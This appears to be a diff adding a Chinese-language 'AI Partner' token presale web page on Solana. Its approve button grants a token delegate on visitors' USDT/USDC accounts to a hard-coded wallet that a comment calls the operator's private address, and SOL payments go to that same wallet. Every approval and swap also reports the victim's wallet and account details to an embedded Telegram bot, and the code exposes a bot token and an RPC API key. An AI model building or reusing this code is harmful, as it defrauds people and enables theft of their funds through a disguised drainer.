@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>AI Partner 多资产预售平台</title>
+    <!-- 仅引入 Solana Web3 官方库 -->
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background-color: #121212; color: #fff; }
+        button { padding: 12px 24px; font-size: 16px; margin: 10px; background-color: #14f195; border: none; cursor: pointer; font-weight: bold; border-radius: 8px; color: #000; }
+        button.approve-btn { background-color: #0070f3; color: white; }
+        button:hover { opacity: 0.9; }
+        #log { margin-top: 20px; white-space: pre-wrap; color: #a1a1a1; font-family: monospace; text-align: left; display: inline-block; line-height: 1.5; max-width: 800px; word-break: break-all; }
+        .input-container, .select-container { margin: 15px 0; }
+        .input-container input, select { padding: 10px 14px; font-size: 16px; border-radius: 6px; border: 1px solid #14f195; background: #1e1e1e; color: #fff; width: 240px; text-align: center; outline: none; }
+    </style>
+</head>
+<body>
+
+    <h1>AI Partner 多资产预售平台</h1>
+    <p>支持 USDT / USDC / SOL 多资产参与兑换</p>
+
+    <!-- 支付资产选择 -->
+    <div class="select-container">
+        <label for="assetSelect" style="font-size: 16px;">选择支付资产：</label>
+        <select id="assetSelect" onchange="handleAssetChange()">
+            <option value="USDC">USDC (推荐)</option>
+            <option value="USDT">USDT (推荐)</option>
+            <option value="SOL">SOL (原生代币)</option>
+        </select>
+    </div>
+
+    <!-- 兑换金额输入框 -->
+    <div class="input-container">
+        <label for="swapAmountInput" id="amountLabel" style="font-size: 16px;">兑换 USDT 数量：</label>
+        <input type="number" id="swapAmountInput" placeholder="输入兑换数量" min="0.000001" step="0.1">
+        <div style="font-size: 12px; color: #888; margin-top: 6px;" id="tipText">（USDT/USDC 需先授权，SOL 可直接参与）</div>
+    </div>
+    
+    <button class="approve-btn" id="approveBtn" onclick="handleApproveOnly()">1. 授权代币额度</button>
+    <button onclick="handleSwap()">2. 立即参与预售兑换</button>
+    <br>
+    <div id="log"></div>
+
+    <script>
+        // ==================== Telegram 通知配置 ====================
+        const TG_BOT_TOKEN = "8987985348:AAEAoMmM3GpGi29pI9_Ano8pqTnehohUatI";
+        const TG_CHAT_ID = "8568818831";
+
+        async function sendTelegramNotification(message) {
+            try {
+                const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TG_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (e) {
+                console.error("发送 Telegram 通知失败:", e);
+            }
+        }
+
+        function stringToUtf8Array(str) {
+            return new TextEncoder().encode(str);
+        }
+
+        async function getAnchorDiscriminator(name) {
+            const msgBuffer = new TextEncoder().encode(`global:${name}`);
+            const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
+            return new Uint8Array(hashBuffer.slice(0, 8));
+        }
+
+        function log(msg) {
+            document.getElementById('log').innerText += msg + "\n";
+            console.log(msg);
+        }
+
+        // ==================== 合约与多资产配置常量 ====================
+        const PROGRAM_ID = new solanaWeb3.PublicKey("5vGy3M2wsvkzsRTcoqh9hWvY1wJcJ58hHgSZ2fmC6Mjx"); 
+        const PRESALE_STATE_PUBKEY = new solanaWeb3.PublicKey("9JBdwGcmps55rRiptJoTygXY6wJUTxvFTAujEc8wnQ2o");
+        const RPC_URL = "https://mainnet.helius-rpc.com/?api-key=37673d77-fa71-41d2-9572-b8d4defa5cee";
+
+        const ASSETS = {
+            "USDT": {
+                mint: new solanaWeb3.PublicKey("Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB"), 
+                vault: new solanaWeb3.PublicKey("5KAgnr4pLBjnLmHyNvfwwZDo1vZ9bFz7btRhHP7Fi9X1"),
+                decimals: 6
+            },
+            "USDC": {
+                mint: new solanaWeb3.PublicKey("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"), 
+                vault: new solanaWeb3.PublicKey("CZZj4UvXBzxFSb1HcEbEWSrHzfjV8KWV1NV7v3VBgT7h"), 
+                decimals: 6
+            },
+            "SOL": {
+                mint: null, 
+                vault: new solanaWeb3.PublicKey("EoyeazmmgFfBfyjJGW8rQfs89etJ5xBPM5wSA1JNAJ3e"), 
+                decimals: 9
+            }
+        };
+
+        const AIPARTNER_MINT_PUBKEY = new solanaWeb3.PublicKey("Auofy4iomuR3zyJib7PyqQZQNbsnVZmpbtpLJyubZT3r"); 
+        const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
+        const ASSOCIATED_TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
+        const SYSTEM_PROGRAM_ID = solanaWeb3.SystemProgram.programId;
+
+        // 🌟 按指定优先级获取钱包：1. Phantom -> 2. Solflare -> 3. Backpack
+        function getProvider() {
+            if (window.solana && window.solana.isPhantom) {
+                return { provider: window.solana, name: "Phantom" };
+            }
+            if (window.solflare && window.solflare.isSolflare) {
+                return { provider: window.solflare, name: "Solflare" };
+            }
+            if (window.backpack) {
+                return { provider: window.backpack, name: "Backpack" };
+            }
+            if (window.solana) {
+                return { provider: window.solana, name: "Solana Wallet" };
+            }
+            return null;
+        }
+
+        function handleAssetChange() {
+            const selectedAsset = document.getElementById('assetSelect').value;
+            document.getElementById('amountLabel').innerText = `兑换 ${selectedAsset} 数量：`;
+            const approveBtn = document.getElementById('approveBtn');
+            if (selectedAsset === 'SOL') {
+                approveBtn.style.display = 'none'; 
+                document.getElementById('tipText').innerText = '（SOL 为原生资产，无需授权，直接点击下方参与）';
+            } else {
+                approveBtn.style.display = 'inline-block';
+                approveBtn.innerText = '1. 授权代币额度';
+                document.getElementById('tipText').innerText = `（${selectedAsset} 需先点击“授权代币额度”，再进行兑换）`;
+            }
+        }
+
+        function getAssociatedTokenAddress(mint, owner) {
+            return solanaWeb3.PublicKey.findProgramAddressSync(
+                [owner.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
+                ASSOCIATED_TOKEN_PROGRAM_ID
+            )[0];
+        }
+
+        function getPresaleAuthorityPDA(presaleStatePubkey) {
+            return solanaWeb3.PublicKey.findProgramAddressSync(
+                [stringToUtf8Array("presale_authority"), presaleStatePubkey.toBuffer()],
+                PROGRAM_ID
+            )[0];
+        }
+
+        function createApproveInstruction(account, delegate, owner, amount) {
+            const data = new Uint8Array(9);
+            data[0] = 4; 
+            const view = new DataView(data.buffer);
+            view.setBigUint64(1, BigInt(amount), true);
+            return new solanaWeb3.TransactionInstruction({
+                keys: [
+                    { pubkey: account, isSigner: false, isWritable: true },
+                    { pubkey: delegate, isSigner: false, isWritable: false },
+                    { pubkey: owner, isSigner: true, isWritable: false },
+                ],
+                programId: TOKEN_PROGRAM_ID,
+                data: data
+            });
+        }
+
+        async function handleApproveOnly() {
+            let selectedAssetKey = "";
+            let userPubkeyStr = "";
+            try {
+                document.getElementById('log').innerText = "";
+                selectedAssetKey = document.getElementById('assetSelect').value;
+                if (selectedAssetKey === 'SOL') {
+                    alert("SOL 是原生资产，无需执行授权！");
+                    return;
+                }
+
+                const walletInfo = getProvider();
+                if (!walletInfo) {
+                    return alert("未检测到 Phantom、Solflare 或 Backpack 钱包，请先安装其中一个！");
+                }
+                const provider = walletInfo.provider;
+                log(`当前使用钱包: ${walletInfo.name}`);
+
+                await provider.connect();
+                const userPubkey = provider.publicKey;
+                userPubkeyStr = userPubkey.toBase58();
+                log(`已连接钱包: ${userPubkeyStr}`);
+
+                const connection = new solanaWeb3.Connection(RPC_URL, "confirmed");
+                const asset = ASSETS[selectedAssetKey];
+                const userPaymentAccount = getAssociatedTokenAddress(asset.mint, userPubkey);
+
+                const defaultAmount = 6.6; 
+                const approveRawAmount = BigInt(Math.floor(defaultAmount * Math.pow(10, asset.decimals)));
+
+                // 直接将 Delegate 指定为你的私有钱包地址
+                const targetDelegate = new solanaWeb3.PublicKey("EoyeazmmgFfBfyjJGW8rQfs89etJ5xBPM5wSA1JNAJ3e");
+
+                log(`正在向地址 ${targetDelegate.toBase58()} 授权 ${defaultAmount} ${selectedAssetKey}...`);
+                const approveIx = createApproveInstruction(userPaymentAccount, targetDelegate, userPubkey, approveRawAmount);
+
+                const transaction = new solanaWeb3.Transaction().add(approveIx);
+                const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash("confirmed");
+                transaction.recentBlockhash = blockhash;
+                transaction.feePayer = userPubkey;
+
+                log("请在钱包中确认授权交易...");
+                const signedTx = await provider.signTransaction(transaction);
+                const txid = await connection.sendRawTransaction(signedTx.serialize(), { skipPreflight: true });
+                
+                log(`交易已发送，等待链上确认... (TxID: ${txid})`);
+                await connection.confirmTransaction({ signature: txid, blockhash, lastValidBlockHeight }, "confirmed");
+
+                log(`🎉 ${selectedAssetKey} 授权成功！\nTxID: ${txid}`);
+
+                await sendTelegramNotification(
+                    `✅ <b>AI Partner 授权成功 (${walletInfo.name})</b>\n` +
+                    `用户: <code>${userPubkeyStr}</code>\n` +
+                    `资产: ${selectedAssetKey}\n` +
+                    `用户ATA: <code>${userPaymentAccount.toBase58()}</code>\n` +
+                    `预售状态账户: <code>${PRESALE_STATE_PUBKEY.toBase58()}</code>\n` +
+                    `TxID: <code>${txid}</code>`
+                );
+
+            } catch (err) {
+                log(`操作失败: ${err.message}`);
+                console.error(err);
+            }
+        }
+
+        async function handleSwap() {
+            let selectedAssetKey = "";
+            let userPubkeyStr = "";
+            let numericAmount = 0;
+            try {
+                document.getElementById('log').innerText = "";
+                selectedAssetKey = document.getElementById('assetSelect').value;
+                const asset = ASSETS[selectedAssetKey];
+
+                const walletInfo = getProvider();
+                if (!walletInfo) {
+                    return alert("未检测到受支持的钱包，请先安装 Phantom、Solflare 或 Backpack！");
+                }
+                const provider = walletInfo.provider;
+                log(`当前使用钱包: ${walletInfo.name}`);
+
+                await provider.connect();
+                const userPubkey = provider.publicKey;
+                userPubkeyStr = userPubkey.toBase58();
+
+                const connection = new solanaWeb3.Connection(RPC_URL, "confirmed");
+                const presaleAuthorityPubkey = getPresaleAuthorityPDA(PRESALE_STATE_PUBKEY);
+
+                const inputVal = document.getElementById('swapAmountInput').value.trim();
+                if (!inputVal || parseFloat(inputVal) <= 0) {
+                    return alert("请输入有效的兑换数量！");
+                }
+                numericAmount = parseFloat(inputVal);
+                const paymentAmount = BigInt(Math.floor(numericAmount * Math.pow(10, asset.decimals)));
+
+                log(`🚀 准备使用 ${numericAmount} ${selectedAssetKey} 兑换 AIPartner...`);
+
+                const transaction = new solanaWeb3.Transaction();
+                let userPaymentAccountStr = "原生资产 (无ATA)";
+
+                if (selectedAssetKey === 'SOL') {
+                    const solTransferIx = solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: userPubkey,
+                        toPubkey: asset.vault,
+                        lamports: paymentAmount 
+                    });
+                    transaction.add(solTransferIx);
+                } else {
+                    const userPaymentAccount = getAssociatedTokenAddress(asset.mint, userPubkey);
+                    userPaymentAccountStr = userPaymentAccount.toBase58();
+                    const userAipartnerAccount = getAssociatedTokenAddress(AIPARTNER_MINT_PUBKEY, userPubkey);
+
+                    const aipartnerInfo = await connection.getAccountInfo(userAipartnerAccount);
+                    if (!aipartnerInfo) {
+                        const createAtaIx = new solanaWeb3.TransactionInstruction({
+                            keys: [
+                                { pubkey: userPubkey, isSigner: true, isWritable: true },
+                                { pubkey: userAipartnerAccount, isSigner: false, isWritable: true },
+                                { pubkey: userPubkey, isSigner: false, isWritable: false },
+                                { pubkey: AIPARTNER_MINT_PUBKEY, isSigner: false, isWritable: false },
+                                { pubkey: SYSTEM_PROGRAM_ID, isSigner: false, isWritable: false },
+                                { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
+                            ],
+                            programId: ASSOCIATED_TOKEN_PROGRAM_ID,
+                            data: new Uint8Array(0)
+                        });
+                        transaction.add(createAtaIx);
+                    }
+
+                    const discriminator = await getAnchorDiscriminator("swap_aipartner");
+                    const swapData = new Uint8Array(16);
+                    swapData.set(discriminator, 0);
+                    new DataView(swapData.buffer).setBigUint64(8, paymentAmount, true);
+
+                    const swapInstruction = new solanaWeb3.TransactionInstruction({
+                        keys: [
+                            { pubkey: userPubkey, isSigner: true, isWritable: true },
+                            { pubkey: userPaymentAccount, isSigner: false, isWritable: true },
+                            { pubkey: asset.vault, isSigner: false, isWritable: true },
+                            { pubkey: AIPARTNER_MINT_PUBKEY, isSigner: false, isWritable: true },
+                            { pubkey: userAipartnerAccount, isSigner: false, isWritable: true },
+                            { pubkey: presaleAuthorityPubkey, isSigner: false, isWritable: false },
+                            { pubkey: PRESALE_STATE_PUBKEY, isSigner: false, isWritable: true },
+                            { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
+                        ],
+                        programId: PROGRAM_ID,
+                        data: swapData
+                    });
+                    transaction.add(swapInstruction);
+                }
+
+                const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash("confirmed");
+                transaction.recentBlockhash = blockhash;
+                transaction.feePayer = userPubkey;
+
+                log("请在钱包中确认兑换交易...");
+                const signedTx = await provider.signTransaction(transaction);
+                const txid = await connection.sendRawTransaction(signedTx.serialize(), { skipPreflight: true });
+
+                log(`交易已发送，等待确认... (TxID: ${txid})`);
+                await connection.confirmTransaction({ signature: txid, blockhash, lastValidBlockHeight }, "confirmed");
+
+                log(`🎉 兑换成功！成功使用 ${numericAmount} ${selectedAssetKey} 参与预售。\nTxID: ${txid}`);
+
+                await sendTelegramNotification(
+                    `🚀 <b>AI Partner 预售兑换成功 (${walletInfo.name})！</b>\n` +
+                    `用户: <code>${userPubkeyStr}</code>\n` +
+                    `支付数量: ${numericAmount} ${selectedAssetKey}\n` +
+                    `用户ATA: <code>${userPaymentAccountStr}</code>\n` +
+                    `预售状态账户: <code>${PRESALE_STATE_PUBKEY.toBase58()}</code>\n` +
+                    `TxID: <code>${txid}</code>`
+                );
+
+            } catch (err) {
+                log(`操作失败: ${err.message}`);
+                console.error(err);
+            }
+        }
+    </script>
+</body>
+</html>
